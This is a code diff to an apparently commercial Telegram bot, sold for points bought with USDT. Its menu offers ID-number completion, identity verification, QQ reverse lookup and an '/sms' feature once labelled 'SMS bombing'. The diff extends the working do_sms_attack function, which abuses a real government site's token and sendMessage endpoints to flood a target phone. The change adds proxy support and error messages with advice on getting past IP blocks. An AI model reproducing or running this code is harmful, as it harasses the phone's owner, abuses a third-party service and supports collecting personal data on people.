@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import sys
-print("===== Bot 精简稳定版（新增 /sms 刷短信，优化错误反馈）=====")
+print("===== Bot 精简稳定版（新增 /sms 刷短信，支持代理）=====")
 
 import os, time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64, itertools
 from datetime import datetime
@@ -356,7 +356,7 @@ def start(update, context):
            f"/bq → 身份证号补全（生成号码）\n"
            f"/2ys → 二要素核实（0.05积分）\n"
            f"/qf → QQ反查历史\n"
-           f"/sms →短信轰炸\n"
+           f"/sms → 刷短信（100条=6积分）\n"
            f"/okcz → USDT充值积分\n"
            f"/cx → 查询余额\n"
            f"/qd → 每日签到\n"
@@ -919,11 +919,18 @@ def ys_id(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
-# ===== /sms 刷短信功能（优化版） =====
+# ===== /sms 刷短信功能（支持代理，优化错误提示） =====
 def do_sms_attack(chat_id, bot, target_count, phone, user_id):
     import random
     token_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/jxpWvCharService/getWvCharToken"
     sms_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/mobile/user/sendMessage"
+    
+    # 代理支持（从环境变量读取）
+    proxies = {}
+    if os.environ.get('HTTP_PROXY'):
+        proxies['http'] = os.environ.get('HTTP_PROXY')
+    if os.environ.get('HTTPS_PROXY'):
+        proxies['https'] = os.environ.get('HTTPS_PROXY')
     
     ua_list = [
         "Mozilla/5.0 (Linux; Android 14; RMX3920 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380353 MMWEBSDK/20240405 MMWEBID/8255 MicroMessenger/Lite Luggage/4.2.7 QQ/9.3.10.37675 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
@@ -956,7 +963,7 @@ def do_sms_attack(chat_id, bot, target_count, phone, user_id):
             count += 1
             try:
                 session.headers.update({"User-Agent": random.choice(ua_list)})
-                token_res = session.post(token_url, json=token_payload, timeout=5, verify=False)
+                token_res = session.post(token_url, json=token_payload, timeout=5, verify=False, proxies=proxies)
                 if token_res.status_code != 200:
                     fail_count += 1
                     if not error_reported and count <= 3:
@@ -976,7 +983,7 @@ def do_sms_attack(chat_id, bot, target_count, phone, user_id):
                     
                 token = data["custom"]["token"]
                 sms_payload = {"token": token, "params": {"mobilephone": phone}}
-                sms_res = session.post(sms_url, json=sms_payload, timeout=5, verify=False)
+                sms_res = session.post(sms_url, json=sms_payload, timeout=5, verify=False, proxies=proxies)
                 
                 if sms_res.status_code == 200:
                     sms_json = sms_res.json()
@@ -993,11 +1000,20 @@ def do_sms_attack(chat_id, bot, target_count, phone, user_id):
                         bot.send_message(chat_id, f"❌ 短信接口HTTP {sms_res.status_code}：{sms_res.text[:200]}")
                         error_reported = True
                         
+            except requests.exceptions.ConnectionError as ce:
+                fail_count += 1
+                if not error_reported and count <= 3:
+                    bot.send_message(chat_id, f"❌ 网络连接失败（无法访问目标服务器）\n可能是服务器IP被限制或DNS解析失败。\n建议：\n1. 检查服务器网络设置\n2. 设置代理（环境变量 HTTP_PROXY / HTTPS_PROXY）\n3. 更换运行环境（如使用有访问权限的VPS）\n错误详情：{ce}")
+                    error_reported = True
+                time.sleep(2)
+                continue
             except Exception as e:
                 fail_count += 1
                 if not error_reported and count <= 3:
                     bot.send_message(chat_id, f"❌ 第{count}次异常：{e}")
                     error_reported = True
+                time.sleep(1)
+                continue
                     
             time.sleep(1.0)
             
